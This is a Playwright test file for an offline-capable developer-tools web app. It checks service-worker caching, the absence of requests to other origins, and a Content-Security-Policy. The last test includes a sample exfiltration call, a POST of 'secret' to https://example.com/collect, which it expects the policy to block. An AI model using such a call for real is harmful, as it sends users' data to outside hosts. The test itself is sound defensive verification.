import { test, expect } from '@playwright/test'
import { editorText, setEditor, waitForEditors } from './helpers'

test('works offline after the first visit (service worker precache)', async ({ page, context, baseURL }) => {
  test.skip(!baseURL?.includes('localhost:4173') && !process.env.BASE_URL, 'requires the production preview server')
  await page.goto('/')
  // Wait until the service worker has installed (precached everything) and activated.
  await page.evaluate(async () => {
    const reg = await navigator.serviceWorker.ready
    return !!reg.active
  })
  // A page is controlled by the worker from its next navigation on.
  await page.reload()
  await expect.poll(() => page.evaluate(() => !!navigator.serviceWorker.controller)).toBe(true)
  await context.setOffline(true)
  // A tool never opened online: its chunk, Monaco and workers must come from the cache.
  await page.goto('/json/formatter')
  await expect(page.getByRole('heading', { level: 1, name: 'JSON Formatter' })).toBeVisible()
  await waitForEditors(page, 2)
  await setEditor(page, 0, '{"offline":true}')
  await expect.poll(() => editorText(page, 1)).toContain('"offline": true')
  await page.goto('/compare/text')
  await expect(page.getByRole('heading', { level: 1, name: 'Text Diff' })).toBeVisible()
  await context.setOffline(false)
})

test('makes no requests to other origins while tools are used', async ({ page, baseURL }) => {
  const origin = new URL(baseURL!).origin
  const foreign: string[] = []
  page.on('request', (r) => {
    const u = r.url()
    if (u.startsWith('data:') || u.startsWith('blob:')) return
    if (new URL(u).origin !== origin) foreign.push(u)
  })
  for (const path of ['/', '/text/case-converter', '/compare/json', '/json/formatter', '/text/markdown-preview', '/web/svg', '/web/meta-tags', '/encoding/jwt', '/developer/regex']) {
    await page.goto(path)
    await page.locator('h1').first().waitFor()
    const sample = page.getByRole('button', { name: /^(Load sample|Load example)$/ }).first()
    if (await sample.count()) await sample.click().catch(() => {})
    await page.waitForTimeout(500)
  }
  expect(foreign, foreign.join('\n')).toEqual([])
})

test('content security policy blocks requests to other origins', async ({ page }) => {
  await page.goto('/')
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')
  expect(csp).toContain("connect-src 'self'")
  const blocked = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/collect', { method: 'POST', body: 'secret' })
      return false
    } catch {
      return true
    }
  })
  expect(blocked).toBe(true)
})
